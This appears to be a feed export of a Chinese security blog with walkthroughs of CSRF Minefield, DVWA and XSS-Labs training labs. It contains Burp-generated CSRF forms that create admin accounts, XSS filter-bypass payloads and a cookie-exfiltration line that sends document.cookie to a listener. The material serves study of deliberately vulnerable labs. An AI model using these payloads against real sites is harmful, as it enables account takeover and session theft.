class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subadminpassword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subadminemail&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123<span class="symbol">&amp;#64;</span>mail<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subadminstatus&quot;</span> <span class="attr">value</span>=<span class="string">&quot;on&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Save&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外，deactivate 功能也存在 csrf，可以任意禁止 customer。</p><h2 id="08-WSTMart-2-0-8"><a href="#08-WSTMart-2-0-8" class="headerlink" title="08 WSTMart 2.0.8"></a>08 WSTMart 2.0.8</h2><p>在职员管理页面添加用户页面存在 csrf，可以任意创建账户登陆后台，构造 PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/wstmart/index.php/admin/staffs/add.html&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;staffId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;loginName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;adad211&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;staffPhoto&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;loginPwd&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;staffName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;adad211&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;staffNo&quot;</span> <span class="attr">value</span>=<span class="string">&quot;211&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;staffRoleId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;workStatus&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;staffStatus&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="09-Hotel-Reservation-System"><a href="#09-Hotel-Reservation-System" class="headerlink" title="09 Hotel Reservation System"></a>09 Hotel Reservation System</h2><p>用户添加页面，创建删除用户都可以 csrf：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/hotelcal/admin/add_account.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;adad&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;adad&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add<span class="symbol">&amp;#95;</span>account&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-OrientDB-3-0-17"><a href="#10-OrientDB-3-0-17" class="headerlink" title="10 OrientDB 3.0.17"></a>10 OrientDB 3.0.17</h2><h2 id="11-Apache-CouchDB-2-3-1"><a href="#11-Apache-CouchDB-2-3-1" class="headerlink" title="11 Apache CouchDB 2.3.1"></a>11 Apache CouchDB 2.3.1</h2><p>靶场中不存在这俩。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶场都是 SameSite 前的一些漏洞，在后 SameSite 时代意义大不了。</p><p>burp 的 csrf 靶场做的很好，可以参考：<br><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions">https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions</a></p>]]></content>
    
    
    <summary type="html">https://github.com/yaksas443/YaksasCSC-Lab/blob/master/WAPT-Lab/CSRF-Minefield.md&lt;br/&gt;https://www.vulnhub.com/entry/csrf-minefield-1,316/</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="WEB" scheme="https://yzctzl.github.io/tags/WEB/"/>
    
    <category term="VulLab" scheme="https://yzctzl.github.io/tags/VulLab/"/>
    
  </entry>
  
  <entry>
    <title>DVWA 靶场通关记录</title>
    <link href="https://yzctzl.github.io/2023/VulLabs/dvwa/"/>
    <id>https://yzctzl.github.io/2023/VulLabs/dvwa/</id>
    <published>2023-05-07T16:00:00.000Z</published>
    <updated>2023-05-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>low 级别未作防护，burp 拦截后直接生成 PoC 就能够实现 CSRF。</p><p>medium 级别对 Referer 做了检查，如果不包含 server_name 就判为非法。<br>需要构造一个包含域名的地址，如：<code>http://vps.ip/server_name/csrf.html</code></p><p>high 级别不仅校验 Referer，还会为每次访问生成一个 token，请求时会判断 token 是否有效。<br>需要先请求一次页面获取 token，然后再将 token 添加到 query 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /dvwa/vulnerabilities/csrf/?password_new=passw0rd&amp;password_conf=passw0rd&amp;Change=Change&amp;user_token=e206c7cd093babd9dde6e91f3f4ed409 HTTP/1.1</span><br><span class="line">Host: 192.168.29.134:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0</span><br><span class="line">Referer: http://vps.ip/192.168.29.134:8080/</span><br><span class="line">Cookie: PHPSESSID=am7fgmrpfvp2epi2l3re28t1qe; security=high</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><p><a href="https://web.dev/samesite-cookies-explained/">https://web.dev/samesite-cookies-explained/</a><br>Lax：GET 携带 Cookie；POST 不携带；None: 无限制；Strict：完全禁止第三方 Cookie</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h3><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h3><p>DOM 型直接作用与浏览器，未与后端产生任何交互。</p><p>low 级别非常简单，没有做任何检查，直接写入 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p>medium 级别对 <code>&lt;script</code> 做了检查，所以需要避开 <code>script</code> 标签，<br>通过 DevTools 分析，需要把 <code>&lt;option </code> 和 <code>&lt;select&gt;</code> 闭合起来，因为这两个标签内部都无法使用 <code>&lt;iframe&gt;</code>，<br>然后使用 <code>&lt;iframe onload=alert(document.cookie)&gt;</code> 来构造一个 XSS：<br><code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;iframe onload=alert(document.cookie)&gt;</code></p><p>high 级别做了白名单处理，这时单纯闭合标签就不起作用了。因为上面两种输入的内容都被视作 <code>$default</code>。如果想要切割开，使用 <code>#/&amp;</code> 符号，所以应该这样构造：<code>English&amp;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p>OOB 带外方法：vps 上监听 <code>nc -nlkvp 8088</code>，然后使用 <code>script</code> 标签 <code>&lt;script /src=//localhost:8088&gt;</code> 或者 <code>&lt;script&gt;new Image().src=&quot;http://localhost:8088/log?output=&quot;+document.cookie;&lt;/scipt&gt;</code></p><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>与 DOM 型相反，反射型的数据需要经过后端服务器，但因后端过滤规则不完善，将恶意 payload 又转发给了用户，经过服务器反射最后起作用。</p><p>low 级别同上省略。</p><p>medium 级别做了字符替换 str_replace 处理，和 DOM 型的 <code>stripos</code> 不同，此处可以采取多种规避规则：</p><ol><li>大小写绕过，<code>&lt;sCrIpT&gt;alert(document.cookie)&gt;&lt;/sCrIpT&gt;</code></li><li>双写方式绕过，<code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&gt;&lt;/script&gt;</code></li><li>注释干扰</li><li>非 script 标签 payload：<code>&lt;iframe onload=alert(document.cookie)&gt;</code>，要闭合无法嵌套 iframe 的标签</li></ol><p>high 级别，对 script 做了正则匹配，可以用 img、body 等标签的事件或者 iframe 等标签的 src 构造可利用的 js 代码。</p><ol><li><code>&lt;img src=&#39;javascript:alert(/xss/)&#39; onerror=alert(/xss/)&gt;</code></li><li><code>&lt;iframe onload=alert(/xss/)&gt;</code></li><li><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</code></li><li><code>&lt;img src=&#39;javascript:alert(/xss/)&#39; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;</code></li><li><code>&lt;a href=&#39;javascript:alert(/xss/)&#39; onclick=alert(&#39;xss&#39;)&gt;click&lt;/a&gt;</code></li></ol><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>存储型和反射型的不同点在于，payload 是保存到后端服务器上的，在取出 payload 时才构成 xss。</p><p>low 级别同上省略。</p><p>medium 级别对 message 做了 strip_tags 是的很难再添加标签，但对 name 的防护很弱，仅在前端限制了长度，后端和反射型相同做了 str_replace。所以仅需在前端修改长度限制，然后直接使用反射型的 xss 即可。</p><p>high 级别和 medium 级别做相同长度突破，然后使用反射型 xss 即可。这里的存储型和反射型做法基本相同。</p>]]></content>
    
    
    <summary type="html">https://github.com/digininja/DVWA/blob/master/README.zh.md</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="WEB" scheme="https://yzctzl.github.io/tags/WEB/"/>
    
    <category term="VulLab" scheme="https://yzctzl.github.io/tags/VulLab/"/>
    
  </entry>
  
  <entry>
    <title>XSS-Labs 靶场通关记录</title>
    <link href="https://yzctzl.github.io/2023/VulLabs/xsslabs/"/>
    <id>https://yzctzl.github.io/2023/VulLabs/xsslabs/</id>
    <published>2023-05-06T16:00:00.000Z</published>
    <updated>2023-05-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="level-01"><a href="#level-01" class="headerlink" title="level 01"></a>level 01</h2><p><code>xsslabs/level1.php?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><h2 id="level-02"><a href="#level-02" class="headerlink" title="level 02"></a>level 02</h2><p><code>xsslabs/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><h2 id="level-03"><a href="#level-03" class="headerlink" title="level 03"></a>level 03</h2><p>已做 htmlspecialchars 将特殊字符：<code>&amp;&lt;&gt;&#39;&quot;</code> 转换为 HTML 实体，但默认不过滤单引号<br><code>xsslabs/level3.php?keyword=&#39; onclick=&#39;alert(document.cookie)&#39;</code><br>经测试无法复现，因为：<code>value=&#39;</code> 被强制转为 <code>value=&quot;</code>，php 版本太高 8.1.2</p><p>使用 fofa 上找到的靶场：<a href="https://xuanluansec.top/">https://xuanluansec.top/</a> 成功复现</p><h2 id="level-04"><a href="#level-04" class="headerlink" title="level 04"></a>level 04</h2><p>和 03 差不多，比 03 更简单，去掉实体编码了<br><code>xsslabs/level4.php?keyword=&quot; onclick=&quot;alert(document.cookie)</code></p><h2 id="level-05"><a href="#level-05" class="headerlink" title="level 05"></a>level 05</h2><p>输入的 keyword 对 on 和 script 做了替换，没找到非 on 开头的事件，放弃使用 input 标签<br>发现没有对特殊字符转换，可以闭合 input 构造新标签实现 xss<br><code>xsslabs/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;alert&lt;/a&gt;&lt;&quot;</code></p><h2 id="level-06"><a href="#level-06" class="headerlink" title="level 06"></a>level 06</h2><p>输入的 keyword 使用 str_replace 对 <code>on/&lt;script/href/src/data</code> 替换为中间下划线<br>str_replace：区分大小写且不循环替换，使用大小写绕过：<br><code>xsslabs/level6.php?keyword=&quot;&gt;&lt;a HrEf=&quot;javascript:alert(/xss/)&quot;&gt;alert&lt;/a&gt;&lt;&quot;</code></p><h2 id="level-07"><a href="#level-07" class="headerlink" title="level 07"></a>level 07</h2><p>输入的 keyword 转为小写，使用 str_replace 对 on&#x2F;script&#x2F;href&#x2F;src&#x2F;data 替换为空<br>这里使用双写，即可绕过：<br><code>xsslabs/level7.php?keyword=&quot;&gt;&lt;a hrhrefef=&quot;javascrscriptipt:alert(/xss/)&quot;&gt;alert&lt;/a&gt;&lt;&quot;</code></p><h2 id="level-08"><a href="#level-08" class="headerlink" title="level 08"></a>level 08</h2><p>输入的 keyword 转为小写，使用 str_replace 对 on&#x2F;script&#x2F;href&#x2F;src&#x2F;data 替换为中间下划线<br><strong>HTML 实体编码在 HTML 页面会被解析而在后端看不到</strong>，所以采取实体编码 <code>javascript:alert(/xss/)</code>：<br><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;lpar;&amp;sol;&amp;#120;&amp;#115;&amp;#115;&amp;sol;&amp;rpar;</code></p><h2 id="level-09"><a href="#level-09" class="headerlink" title="level 09"></a>level 09</h2><p>与 08 类似，仅多了校验是否存在 http:&#x2F;&#x2F;，alert 一个即可 <code>javascript:alert(&quot;http://&quot;)</code>：<br><code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;lpar;&amp;quot;http://&amp;quot;&amp;rpar;</code></p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>前端源码中存在三个隐藏标签，其中第三个生效：<code>&amp;t_sort=&quot; onclick=&quot;javascript:alert(/xss/)&quot; type=&quot;text</code></p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>同 10，不过 xss 位置位于 Referer：<code>Referer: &quot; onclick=&quot;javascript:alert(/xss/)&quot; type=&quot;text</code></p><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>同 10，不过 xss 位置位于 User-Agent：<code>User-Agent: &quot; onclick=&quot;javascript:alert(/xss/)&quot; type=&quot;text</code></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>同 10，但位于 Cookie[user]：<code>Cookie: user=&quot; onclick=&quot;javascript:alert(/xss/)&quot; type=&quot;text</code></p><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>其包含的网站已经挂了，引起 xss 的原理为：<br>当网站读取图片 exif 中的恶意 payload 显示在网页中时，触发 payload 构成 xss。<br>找到两个网站：<a href="https://exif.tools/">https://exif.tools/</a> <a href="https://jimpl.com/">https://jimpl.com/</a><br>第一个可以触发漏洞，第二个无法触发。修改 level14.php 为第一个。<br>然后使用 exiftool 写入 <code>exiftool -artist=&#39;&quot;&lt;img src=//oob.vps.ip:8808 onclick=alert(/xss/)&gt;&#39; exif.jpg</code></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>看到 src 最后作用到了 <code>&lt;!-- --&gt;</code> 之间，但尝试 xss 失败。<br>AngularJS ng-include 指令可以将 HTML 页面包含在当前页面中，可以将 level10 页面包含进来：<br><code>level15.php?src=%27level10.php?t_sort=%22%20onclick=alert(/xss/)%20type=%22text%22%20%3E%3C%20%27</code></p><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>输入的 keyword 转为小写，使用 str_replace 对 空格，&#x2F;，script，tab 做了替换<br>尝试用：<code>&amp;#32;</code> 和 %0A 以及 HTML 等编码替换，发现 %0A 可以<br><code>level16.php?keyword=&lt;svg%0Aonclick=alert(1)&gt;</code></p><h2 id="level-17-20"><a href="#level-17-20" class="headerlink" title="level 17-20"></a>level 17-20</h2><p>关于 Flash 的，略过<br><a href="https://cloud.tencent.com/developer/beta/article/1746740">https://cloud.tencent.com/developer/beta/article/1746740</a></p>]]></content>
    
    
    <summary type="html">https://github.com/do0dl3/xss-labs</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://yzctzl.github.io/tags/Web/"/>
    
    <category term="VulLab" scheme="https://yzctzl.github.io/tags/VulLab/"/>
    
  </entry>
  
  <entry>
    <title>空</title>
    <link href="https://yzctzl.github.io/2023/emptiness/"/>
    <id>https://yzctzl.github.io/2023/emptiness/</id>
    <published>2023-04-13T16:00:00.000Z</published>
    <updated>2023-04-13T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="823123dbc5f0b3d6b0fe8866de3d867026937226656f632b4d6979df518d70f8">15c2f7342c10e47b969a852fda4fda9af7b4ec71413711b5a38255f537a3bed5292cc0e89997e1feb8e95bfa7f39ee72e1548ab50bca6783a7746fabec8a672e29469b32797517b66d913eb975203305bd75acb3e099d5d71e06db36eb5434fc9958bf22b7b5eae48a6d9440a1c44edbd72cec1b590be9bab6fb6af4a10ade9f99b4a03c020953458b20500a2996bb8d828d80eddf9f9f4ba0b8d8a406453112c1896b075576e36ecab277d8dcbcec97a966c123cb0e11a893a984d77dd9595aae09cda6ed248ed8e7538b94e69d2280973e7dc07dbd3616a567947a22302af0f8063eaeef15910b84bf53f603d7ae0a959a7ae785224e9f6c5e0e1eb22d9eb9ee5e9955031b367ac957e087c157bfd65ca7c6bc7d66cd93850179e9ea5ae4b9b174d99169c83b52953ea2769c988e7dfbd43d4872ea1db7044df8615d9d6545b1463b490b5679ac965c7f19c33d7506ed281a0ec3594614a8460c2110c48d4168f94965f9327b2042e2c82f5f2e0ac3af0e533271ddc007b15fb4f5a72770563d281d1f9af93a867f6668242b92c82040fc08356a7b3f16648de3b11313494bb7cd20e1ffe068bcc22880c9aaca194c3f9c29da93557c21050cfde1abcddcf2fb539a6f725ea8fdaaf038548aa4c2b9faf6591ec919b698578e26c920b7dffa12d5ff2100b9317dbbcfe7a1a12c0fb3347fa4749aa25a40bcde50213f73f4b6a46c12bd66d234723382c7ebc05f08b9f7dc68ce1cee64c7bde8a7349a613add3b6fb3fa84c5e8d89ae499ce19e0093050ebe663fff72432088b514f5ef03f2a34d9eb88aba7ec11f421efa0dc2bf38a47dba0f2475f3b847b709b113ccaece5ff8526f5c9121c53e9e1b6ea59cc52061442fa32a244675ece9d2f6a38c4962c23badc0bc17a364c17ce88e4064adc8688d917d2f63a223bc15ba04089ede520aa047ca19e8e523d795c213cbcd6095b1771a83105716f338ad89367e7c8ef50e8e1ed3af7f16526dbe79cadd3762574d15489536fe21fb0464133f8da0fc8bb5047c65495d558ef2d6397bce3152ac6de99e2820d7f7b9f69ca8d26fc5f29d4d5f3edc512059448d160d7174bb8c9ea86944e85ddc6d9044581fc80f3a72240537719ba4c2da9619b2f3a6a686adcc8565166fdc91bc916137487b2550395eb281c758eaee0fc7337497b0f4f4d5de1aeec9ec89ff0ce92c10b768c441d7dad90bf959bb60055968dd9cf95b57bbce8ad7fa78db5aa625e33e081e4020e020e29ea461d51276b25a1fd538329782236e8ef65552b74cca50c1fb84af6ea1f73fff8e151f9f719eff4d7a13cc504e33555bf30ce115e074fd296a4eac51284012a173b32a21b6d2fae6c1696f09d0400ae56471ecb26e205d245d928ef61eab436beb7f972769f956f2d415d8a92a7a57bc1b76ab41bf3c654f36b95bd9eaa5b84f229c8769ce1a5a790e55a4ee0d1f8eb91f7eea66dc1f2b6afd70c2c944970c7a5d061dc98a81975a8660548b14346bd4de77e201c2fb4010783585cf93f54288bb6f139364516dec98f3152404e6505167361ca2f0a1bb5ba30a220e9fcfe19a952942d0f1a036c49c1413761cae5337e6f35cd9e7ce22886d6160c752fea3e3f3aa5961f23e3016116aaff6abda1a9cea2d48d510047f5e7806965bbe8c51a01f5a8bfd9ea22eb22827cde312734c708ce1d4f1948a8f877a7f8de40803a73af9c2497b4328186ce81f44d7eeb163633ed7737c2a7e787d8d7f756a5489ff8004a3480879b2078a8d9a25176c1f960bd8602387a5625c62d5f25b6675933015c80758d4965a25fb1e5ce25966134a817a83314a49a4fe20de170a5385c32d33152d72efcc665335e2c0514cd4be428b6162c839bd17019cda2770e726471137db61cba4f2a765f653ffc505a08edccf287171d7f0ae4c2c3e9fa8e298ad2542a71a1ce45a1ba4833435885c359dcca5087e09977febd5cb7056f89857cf7d01b6276aa80235b1e2dfa4a0f61c2e25bd96c215843a7db68e70c53900abfd22af120825b1315f231d1b62a17ae38b5cd236e99664f5b6002b576956fe743249c610ca61cc0f0c3d6c36b480d69257420d2a6129baa1fd091c11ed651a2d4cb16b34abcdb92271029a0a93cf8c751a5560122b50753b4731915dd063d20e9cf64bfd0f76891bac58a57df82ebe1e01b7923e6a06433ab46a76848a6878fd8532dfe2bd5f0053124cf2134a11abf8df3ef8dd38787c35582db094d781b90a887c7757a9459c7d912110fa5552485d391b2771d592ba1f1f20737ff0b39f74b91d7c46eeb85c5f0498708f1e77d52f548073f0db63cb3e4fd50ec88e3db6ff31be1262b545ec7c96be9723f5586263e7063c506539b8407ef0de22ac5529172d484bc097b090cf50fba1c2523ab4558d7bd96698e99c3c7d00f4d7956ecf858e5ee9c571493cf322b216078812b4862db94103d01dd1ecc7d34d1a5315a1403fc3eb46d506885a20f084c08c4241d24c3b006cb4095986cfe7444a333517f4477e03e3dd37ad05c738abc13ad602821ea873ea2a472a89eeaf93fe1e388ab7a7c56ab173dfcd18d1c57b23f7e3bbdfb8da33937ded45ccd6f5443b7f03606c67a729f677ae9e344b782e60534a28463ef935d1d6d51655d6935c2ed431baf9af16fd8f6206f6a73b389f69df6f47decdd99a209ea5d7e688556289884a0062ce082ead344a51f28fdacbd0682b6194da024e53b2d1e0ca5bea9c13af09d95130055f154e2587eb08adc1a680651bf7a41512c5a0baf58f44960a9cde9a40e5de200ec35be37f21d834ae8bcea43a3e89217b88683d6aa48e9b9bd60254a43b4ac14e06e9d9332a8a6e750059bf43c387e005404f1c